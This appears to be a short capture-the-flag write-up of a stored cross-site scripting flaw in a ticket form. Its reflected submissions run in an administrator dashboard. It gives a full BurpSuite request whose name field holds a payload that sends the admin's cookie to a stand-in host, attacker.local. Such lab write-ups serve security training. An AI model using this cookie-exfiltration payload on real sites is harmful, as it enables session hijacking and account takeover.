- __Vulnerability__: Cross-site Scripting
- __Goal__: retrieve administrator's cookie / session and gain administrator access to the application
- __Description__: After reviewing the application's source code, we observe that user submissions are reflected to the admin dashboard without proper input validation; thus, an attacker can send a malicious HTML payload that is executed as part of the administrator dashboard after ticket submissions are loaded.

#### BurpSuite HTTP request

```sh
POST /api/submit_ticket HTTP/1.1
Host: victim.local
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Connection: close
Content-Length: X

{

"name":"<img src=x onerror='document.write(\"<img src=http://attacker.local/?data=\"+document.cookie+\"/>\")'/>",
"email":"admin@gearhost.htb",
"website":"http://127.0.0.1:1337/tickets",
"message":"Heh wrong parameter"

}
```